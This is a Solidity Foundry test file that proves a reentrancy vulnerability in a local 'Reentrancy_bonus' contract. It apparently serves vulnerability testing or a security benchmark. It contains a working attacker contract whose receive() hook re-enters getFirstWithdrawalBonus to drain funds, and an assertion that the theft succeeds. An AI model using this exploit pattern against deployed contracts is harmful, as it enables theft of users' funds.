// SPDX-License-Identifier: MIT
pragma solidity 0.8.26;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/reentrancy_bonus.sol";

// Define struct at contract level to avoid compilation errors
contract ReentrancyBonusTest is Test {
    struct StateSnapshot {
        uint256 contractBalance;
        uint256 attackerBalance;
        uint256 totalRewardsDistributed;
        uint256 attackerRewards;
        uint256 totalClaims;
    }
    
    Reentrancy_bonus public bonusContract;
    Attacker public attackerContract;
    uint256 constant ATTACKER_INITIAL_BALANCE = 1 ether;

    function setUp() public {
        // Deploy main contract
        bonusContract = new Reentrancy_bonus();
        
        // Deploy attacker contract
        attackerContract = new Attacker(bonusContract);
        
        // Fund contracts
        vm.deal(address(attackerContract), ATTACKER_INITIAL_BALANCE);
        vm.deal(address(bonusContract), 1 ether);
    }

    function testReentrancyExploit() public {
        // Pre-attack state
        console.log("--- BEFORE-Trigger State Snapshot ---");
        StateSnapshot memory initial;
        initial.contractBalance = address(bonusContract).balance;
        initial.attackerBalance = address(attackerContract).balance;
        initial.totalRewardsDistributed = bonusContract.totalRewardsDistributed();
        initial.attackerRewards = bonusContract.userTotalRewards(address(attackerContract));
        initial.totalClaims = bonusContract.totalBonusClaims();
        
        console.log("Contract ETH balance:", initial.contractBalance);
        console.log("Attacker ETH balance:", initial.attackerBalance);
        console.log("Total rewards distributed:", initial.totalRewardsDistributed);
        console.log("Attacker rewards:", initial.attackerRewards);
        console.log("Total bonus claims:", initial.totalClaims);

        // Execute attack
        console.log("--- Trigger Attack ---");
        attackerContract.attack();
        
        // Post-attack state
        console.log("--- AFTER-Trigger State Snapshot ---");
        StateSnapshot memory finalSnapshot;
        finalSnapshot.contractBalance = address(bonusContract).balance;
        finalSnapshot.attackerBalance = address(attackerContract).balance;
        finalSnapshot.totalRewardsDistributed = bonusContract.totalRewardsDistributed();
        finalSnapshot.attackerRewards = bonusContract.userTotalRewards(address(attackerContract));
        finalSnapshot.totalClaims = bonusContract.totalBonusClaims();
        
        console.log("Contract ETH balance:", finalSnapshot.contractBalance);
        console.log("Attacker ETH balance:", finalSnapshot.attackerBalance);
        console.log("Total rewards distributed:", finalSnapshot.totalRewardsDistributed);
        console.log("Attacker rewards:", finalSnapshot.attackerRewards);
        console.log("Total bonus claims:", finalSnapshot.totalClaims);
        
        // Differential analysis
        console.log("--- Differential Results ---");
        bool rewardsChanged = finalSnapshot.totalRewardsDistributed != initial.totalRewardsDistributed;
        bool attackerRewardsChanged = finalSnapshot.attackerRewards != initial.attackerRewards;
        bool claimsIncreased = finalSnapshot.totalClaims > initial.totalClaims;
        bool balanceAnomaly = (finalSnapshot.contractBalance < initial.contractBalance - 100) &&
                            (finalSnapshot.attackerBalance > initial.attackerBalance + 100);
        
        console.log("Total rewards distributed changed:", rewardsChanged);
        console.log("Attacker rewards changed:", attackerRewardsChanged);
        console.log("Total claims increased:", claimsIncreased);
        console.log("Balance anomaly detected:", balanceAnomaly);
        
        // Vulnerability verdict
        string memory reason;
        if (rewardsChanged && attackerRewardsChanged && claimsIncreased && balanceAnomaly) {
            reason = "Reentrancy attack succeeded with unauthorized state changes";
            console.log("Vulnerability Exists: %s", reason);
        } else {
            reason = "No significant changes consistent with reentrancy attack";
            console.log("Vulnerability not Exist: %s", reason);
        }

        // Original assertions for test criteria
        assertTrue(balanceAnomaly, "Contract funds not stolen");
    }
}

contract Attacker {
    Reentrancy_bonus public bonusContract;
    address public owner;
    uint256 private reentryCount = 0;

    constructor(Reentrancy_bonus _bonusContract) {
        bonusContract = _bonusContract;
        owner = msg.sender;
    }
    
    function attack() external {
        bonusContract.getFirstWithdrawalBonus(address(this));
    }
    
    receive() external payable {
        if (reentryCount < 1) {
            reentryCount++;
            bonusContract.getFirstWithdrawalBonus(address(this));
        }
    }
}